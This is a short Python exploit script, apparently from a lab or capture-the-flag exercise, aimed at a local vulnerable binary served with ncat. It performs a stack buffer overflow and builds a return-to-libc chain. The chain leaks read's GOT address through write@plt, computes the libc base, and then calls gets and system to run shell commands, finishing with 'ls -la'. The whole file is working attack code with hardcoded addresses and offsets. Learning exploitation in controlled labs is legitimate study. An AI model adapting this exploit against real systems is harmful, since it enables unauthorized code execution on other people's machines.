import socket
import struct
import re
import time

# ncat -vc 'LD_LIBRARY_PATH=. ./vuln1' -kl 8888
# python exp1.py

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
sc.connect(('localhost', 8888))

def W(x):
  sc.send(x)

def R():
  return sc.recv(4096)

def PI(x):
  return struct.pack('I', x)

def UI(s):
  return struct.unpack('I', s)[0]

print R()

write_plt = 0x08048370
main_text = 0x0804847d
read_got = 0x804a00c
read_offset = 0x000d9d20
gets_offset = 0x00064ae0
system_offset = 0x0003fc40

W('A'*28 + PI(write_plt) + PI(main_text) + PI(1) + PI(read_got) + PI(4))

libc_base = UI(R()[0:4]) - read_offset
print 'libc_base = ' + hex(libc_base)

gets_libc = gets_offset + libc_base
system_libc = system_offset + libc_base
free_buf = 0x804a010

W('A'*20 + PI(gets_libc) + PI(system_libc) + PI(free_buf) + PI(free_buf))

time.sleep(0.5)

W('ls -la\n')

print R()
